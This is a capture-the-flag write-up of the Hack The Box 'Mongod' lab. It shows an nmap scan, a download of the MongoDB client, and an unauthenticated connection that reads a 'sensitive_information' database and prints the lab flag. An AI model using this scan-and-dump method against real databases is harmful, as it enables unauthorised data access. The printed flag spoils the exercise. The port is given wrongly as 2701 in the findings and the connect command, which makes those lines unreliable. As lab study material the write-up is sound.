
# Mongod
---
## Getting Started
---
Use command to set Target IP
```bash
IP='10.129.34.15' ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```
---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -p- --min-rate=1000 -sV $IP | copy
```

>-p- : This flag scans for all TCP ports ranging from 0-65535  
-sV : Attempts to determine the version of the service running on a port  
--min-rate : This is used to specify the minimum number of packets that Nmap should  
send per second; it speeds up the scan as the number goes higher

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 16:56 EDT
Warning: 10.129.34.15 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.34.15
Host is up (0.026s latency).
Not shown: 65438 closed tcp ports (conn-refused), 95 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.22 seconds

```

**Findings**
Port 2701 is running Service mongodb MongoDB  3.6.8


---
## Foothold
Down load mongodb
```bash
curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz
```
uncompress it
```bash
tar xvf mongodb-linux-x86_64-3.4.7.tgz
```
cd /bin
```bash
┌──(kali㉿kali)-[~/…/Study/HackTheBox/Tier0/Mongod]
└─$ cd mongodb-linux-x86_64-3.4.7/bin

```
Run 
```bash 
./mongo mongodb://$IP:2701
```

```bash
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> use sensitive_information
switched to db sensitive_information
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> use sensitive_information
switched to db sensitive_information
> show collections
flag
> db.flag.find().pretty();
{
        "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
        "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
> 
```


---
## Flags
db.flag.find().pretty();
```bash
1b6e6fb359e7c40241b6d431427ba6ea
```


---
## Tags
---
#mongodb